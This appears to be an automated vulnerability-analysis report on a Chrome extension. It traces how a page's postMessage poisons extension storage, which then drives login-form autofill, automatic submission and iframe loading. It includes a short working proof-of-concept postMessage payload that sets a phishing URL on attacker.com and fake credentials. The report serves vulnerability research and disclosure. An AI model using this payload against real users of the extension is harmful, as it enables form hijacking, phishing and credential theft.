# CoCo Analysis: donkdpbffcemjgchkdlkhpkfnemlglkl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (chrome_storage_local_set_sink)

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/donkdpbffcemjgchkdlkhpkfnemlglkl/opgen_generated_files/cs_0.js
Line 468   window.addEventListener('message', function(e) {
Line 474     if (e.type === 'message' && e.data.type === 'LAUNCH_PROVIDER') {
Line 476       chrome.storage.local.set({ attributes: e.data.attributes }, function() {
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js lines 468-477)
window.addEventListener('message', function (e) {
    if (e.type === 'message' && e.data.type === 'LAUNCH_PROVIDER') {
        chrome.storage.local.set({ attributes: e.data.attributes }, function () { // ← attacker-controlled
            chrome.runtime.sendMessage({
                action: 'inject',
                data: location.href
            });
        });
    }
});

// Background script - Message handler (bg.js lines 989-998)
chrome.runtime.onMessage.addListener(function({action, data}) {
    if (action === 'inject') {
        chrome.tabs.query({currentWindow: true, active: true}, function(tabs){
            chrome.scripting.executeScript({
                target: {tabId: tabs[0].id, allFrames: true},
                files: ['js/provider-script.js'], // Injects script that reads poisoned storage
            });
        });
    }
});

// Provider script - Uses poisoned data (provider-script.js lines 2-35, 54)
chrome.storage.local.get('attributes', function(db) {
    if (typeof db.attributes !== 'undefined') {
        var attr = db.attributes; // ← attacker-controlled attributes

        if (attr.login_url !== null && attr.login_url != null) {
            var elements = {username: null, password: null, submit: null}

            if (typeof attr.login_form !== 'undefined') {
                if (typeof attr.login_form.elements !== 'undefined') {
                    attr.login_form.elements.forEach(function(p) {
                        elements[p.purpose] = document.querySelector(
                            `${p.type}[${p.selector}*=${p.identifier}]` // ← attacker controls selector
                        );
                    });
                }
            }

            // Set values on selected elements
            elements?.username?.setAttribute('value', attr.username); // ← attacker controls values
            elements?.password?.setAttribute('value', attr.password);

            // Click submit button
            if (elements.submit !== null) {
                elements.submit?.click();
            }

            // Create iframe with attacker-controlled URL
            var iframe = document.createElement('iframe');
            iframe.setAttribute('src', (attr.login_url || null)); // ← attacker controls URL
            document.getElementById('sso-browser-frame').appendChild(iframe);
        }
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from any webpage (content script runs on `<all_urls>`)

**Attack:**

```javascript
// On any webpage, execute this to poison storage and trigger exploitation
window.postMessage({
    type: 'LAUNCH_PROVIDER',
    attributes: {
        login_url: 'https://attacker.com/phishing',
        username: 'stolen_user',
        password: 'stolen_pass',
        login_form: {
            elements: [
                { purpose: 'username', type: 'input', selector: 'name', identifier: 'user' },
                { purpose: 'password', type: 'input', selector: 'name', identifier: 'pass' },
                { purpose: 'submit', type: 'button', selector: 'type', identifier: 'submit' }
            ]
        }
    }
}, '*');
```

**Impact:** Complete storage exploitation chain with multiple severe impacts:
1. **DOM-based XSS/Injection**: Attacker controls DOM selectors and can manipulate arbitrary page elements
2. **Credential theft**: Attacker can set username/password values and trigger form submission
3. **Phishing**: Attacker can inject iframes pointing to phishing sites via `login_url`
4. **Form hijacking**: Attacker controls which elements are selected and manipulated
The poisoned data flows from postMessage → storage.set → storage.get → DOM manipulation with exploitable impact including credential theft and phishing attacks.
